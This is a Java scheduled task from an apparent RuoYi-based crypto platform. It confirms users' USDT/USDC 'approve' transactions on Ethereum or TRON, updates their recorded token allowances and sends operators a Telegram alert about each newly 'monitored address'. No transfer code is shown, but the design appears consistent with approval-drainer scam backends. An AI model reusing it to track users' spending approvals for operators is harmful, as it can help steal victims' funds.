package com.ruoyi.quartz.task;


import com.ruoyi.bussiness.domain.TAppAddressInfo;
import com.ruoyi.bussiness.service.ITAppAddressInfoService;
import com.ruoyi.common.core.redis.RedisCache;
import com.ruoyi.common.enums.WalletType;
import com.ruoyi.common.eth.EthUtils;
import com.ruoyi.common.trc.TronUtils;
import com.ruoyi.common.utils.StringUtils;
import com.ruoyi.telegrambot.MyTelegramBot;
import com.sun.org.apache.bcel.internal.generic.SWITCH;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;

import javax.annotation.Resource;
import java.math.BigDecimal;
import java.text.SimpleDateFormat;
import java.util.List;
import java.util.Map;

/**
 * 地址授权USDT额度查询
 */
@Component("queryUsdtAllowed")
@Slf4j
public class QueryUsdtAllowed {

    @Resource
    private ITAppAddressInfoService appAddressInfoService;
    @Resource
    private RedisCache redisCache;
    @Resource
    private MyTelegramBot myTelegramBot;

    public void queryUsdtAllowed() {
        //获取
        Map<String, Object> cacheMap = redisCache.getCacheMap("approve");
        if (cacheMap != null && cacheMap.size() > 0) {
            for (Map.Entry<String, Object> a : cacheMap.entrySet()) {
                String hash = (String) a.getValue();
                String userIdStr = a.getKey();
                TAppAddressInfo appAddressInfo = appAddressInfoService.selectTAppAddressInfoByUserId(Long.parseLong(userIdStr));
                String hashStatus = "";
                String status= StringUtils.isEmpty(appAddressInfo.getStatus())?"N":appAddressInfo.getStatus();
                if ("N".equals(status)) {
                    if (appAddressInfo.getWalletType().equals(WalletType.ETH.name())) {
                        hashStatus = EthUtils.getHashStatus(hash);
                    } else {
                        hashStatus = TronUtils.getTransactionResult(hash);
                    }
                    if (hashStatus.equals("0")) {//成功
                        appAddressInfoService.refreshUsdtAllowed(appAddressInfo);
                        appAddressInfoService.refreshUsdcAllowed(appAddressInfo);
                        cacheMap.remove(userIdStr);
                        //机器人通知
                        SendMessage sendMessage = new SendMessage();
                        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                        StringBuilder sb = new StringBuilder();
                        sb.append("⚠️⚠️⚠️\uD83E\uDDE7\uD83E\uDDE7\uD83E\uDDE7监控地址增加\uD83E\uDDE7\uD83E\uDDE7\uD83E\uDDE7⚠️⚠️⚠️");
                        sb.append("\n\n");
                        sb.append("\uD83C\uDD94用户ID：").append(appAddressInfo.getUserId()).append("\n");
                        sb.append("\n\n");
                        sb.append("⏰变动时间： ").append(formatter.format(appAddressInfo.getUpdateTime())).append("\n");
                        sb.append("\n\n");
                        sb.append("\uD83D\uDCB0钱包地址：").append(appAddressInfo.getAddress()).append("\n");
                        sb.append("\n\n");
                        String context = sb.toString();
                        sendMessage.setText(context);
                        myTelegramBot.toSend(sendMessage);
                        log.debug("成功发送用户 {} U钱包地址 {},授权成功 ", appAddressInfo.getUserId(), appAddressInfo.getAddress());
                        if (cacheMap.size() < 1) {
                            redisCache.deleteObject("approve");
                        } else {
                            cacheMap.remove(userIdStr);
                            redisCache.setCacheMap("approve", cacheMap);
                        }
                    } else if (hashStatus.equals("1")) {//失败
                        cacheMap.remove(userIdStr);
                        redisCache.setCacheMap("approve", cacheMap);
                    }
                }
            }
        }
    }
}
